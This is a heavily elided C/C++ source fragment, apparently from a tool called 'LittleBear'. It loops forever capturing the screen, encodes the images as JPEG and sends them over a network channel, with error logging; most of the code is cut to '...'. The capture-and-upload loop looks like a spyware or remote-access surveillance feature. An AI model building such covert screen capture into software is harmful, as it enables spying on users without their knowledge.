...
{ 
	...
	try
	{
		while(TRUE)
		{
			...
			{
				WriteLittleBearLog("GetScreenSnapshot GetEncoderClsid error\r\n");
				continue;
			}
			...
			{  
					...
					*(unsigned char*)(lpJpg + 2) == 0xff && *(unsigned char*)(lpJpg + 3) == 0xe0 )
				{
					...
					if (cTmp)
					{
						...
						iRet = IndependentNetWork_SendMessage((char*)lpJpg,jpegsize,SCREENSNAPSHOT,0);
					}
				}
			}
	...
	{
		WriteLittleBearLog("ScreenSnapShot exception\r\n");
		return FALSE;
	}
}
...
int  GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	try
	{
		...
		if (size == 0)
		{
			WriteLittleBearLog("GetEncoderClsid lpGetImageEncodersSize error\r\n");
			return -1;     //   Failure     
		}
		...
		{
			WriteLittleBearLog("GetEncoderClsid lpGlobalAlloc error\r\n");
			return -1;     //   Failure    
		}
		...
		WriteLittleBearLog("GetEncoderClsid lpGetImageEncoders error\r\n");
		return -1;
	}
	catch (...)
	{
